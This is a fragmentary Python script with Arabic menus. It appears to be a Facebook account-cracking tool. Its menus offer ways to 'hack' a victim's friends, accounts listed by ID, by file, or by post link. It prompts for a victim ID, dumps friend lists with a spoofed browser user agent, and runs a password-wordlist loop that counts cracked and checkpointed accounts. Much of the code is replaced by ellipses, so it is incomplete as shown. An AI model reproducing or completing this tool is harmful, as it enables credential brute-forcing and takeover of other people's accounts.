...
/        /      \    \___/       '''
	...
	cetak(nel(oi, title='[bold cyan] • ﺭﻮﻄﻤﻟﺍ ﺕﺎﻣﻮﻠﻌﻣ • [/bold cyan]'))
 #logen
...
def menu(my_name,my_id):
	...
	sol().print(fx)
	print(x+'['+h+'•'+x+'] ﻚﺑﺎﺴﺣ : '+str(my_name))
	print(x+'['+h+'•'+x+'] ﻚﻳﺩ ﻱﺍ    : '+str(my_id))
	print(x+'['+h+'•'+x+'] IP ADDRESS  : '+str(sh['origin']))
	io = '''[bold cyan][01] ﺔﻴﺤﻀﻟﺍ ﺀﺎﻗﺪﺻﺍ ﻕﺍﺮﺘﺧﺍ	     [06]  ﻒﻠﻣ ﻕﺍﺮﺘﺧﺍ
[02]  ﻱﺩ ﻱﺍ ﻦﻣ ﺮﺜﻛﺍ ﻕﺍﺮﺘﺧﺍ    [07] ﻦﻴﻣﺄﺘﻟﺍ ﺕﺍﺭﺎﻴﺧ ﻦﻣ ﻖﻘﺤﺗ
[03] ﺎﺒﻳﺮﻗ ﻦﻴﻌﺑﺎﺘﻣ ﻕﺍﺮﺧﺍ		     [08] ﺎﺒﻳﺮﻗ 
[04]  ﺭﻮﺸﻨﻣ ﻂﺑﺍﺭ ﻦﻣ ﻕﺍﺮﺘﺧﺍ 	     [09] ﺎﺒﻳﺮﻗ
[05] ﺎﺒﻳﺮﻗ ﺏﻭﺮﻗ ﺀﺎﻀﻋﺍ ﻕﺍﺮﺘﺧﺍ           [00] ﺝﻭﺮﺨﻟﺍ ﻞﻴﺠﺴﺗ[bold cyan]'''
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='[bold cyan] • ﺕﺍﺭﺎﻴﺨﻟﺍ • [/bold cyan]'))
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] ﻚﺋﺎﻗﺪﺻﺃ ﻦﻣ ﻦﻴﻤﺨﺘﻟﺍ ﺪﻳﺮﺗ ﺖﻨﻛ ﺍﺫﺇ "me" ﺐﺘﻛﺍ')
	pil = input(x+'['+p+'f'+x+'] ﺔﻴﺤﻀﻟﺍ ﻱﺩ ﻱﺍ ﻖﺼﻟﺍ : ')
	dumpdump(pil)
	print(x+'['+h+'•'+x+'] ﻪﺋﺎﻗﺪﺻﺍ ﺩﺪﻋ : '+str(len(id)))
	setting()
def dumpdump(pil):
	try:
		head = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0'}
...
def setting():
	...
	teks = '[01] ﻻﻭﺍ ﺔﻤﻳﺪﻘﻟﺍ ﺕﺎﺑﺎﺴﺤﻟﺍ ﻕﺍﺮﺘﺧﺍ\n[02] ﻻﻭﺍ ﺓﺪﻳﺪﺠﻟﺍ ﺕﺎﺑﺎﺴﺤﻟﺍ ﻕﺍﺮﺘﺧﺍ\n[03] ﻞﻣﺎﻛ ﻕﺍﺮﺘﺧﺍ'
	...
	if hu in ['1','01']:
		...
		sol().print(mark(ric, style='red'))
		exit()
	met = '# ﻕﺍﺮﺘﺧﻻﺍ ﺔﻘﻳﺮﻃ ﺭﺎﺘﺧﺍ'
	sol().print(mark(met, style='green'))
	ioz = '[01] ﻞﻀﻓﻷﺍ ﻢﻳﺪﻗ ﻲﻓ\n[02] ﻉﺮﺳﻻﺍ ﻲﻧﺎﺠﻣ ﻙﻮﺑ ﺲﻴﻓ\n[03] ﻱﺩﺎﻋ ﻕﺍﺮﺘﺧﺍ\n[04] ﺢﻔﺼﺘﻣ ﻕﺍﺮﺘﺧﺍ'
...
# WORDLIST
def passwrd():
	ler = '# ﻒﻗﻮﺘﻠﻟ Z + ctrl ﻰﻠﻋ ﻂﻐﺿﺍ ،ﻕﺍﺮﺘﺧﻻﺍ ﺔﻴﻠﻤﻋ ﺀﺪﺑ'
...
#	ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.1.2222.33 Safari/537.36'
	...
	sys.stdout.write('\r%s ﺔﺒﺴﻨﻟﺍ %s/%s [ ﻪﻗﺍﺮﺘﺧﺍ ﻢﺗ:%s - ﺪﻴﻛﺄﺗ:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
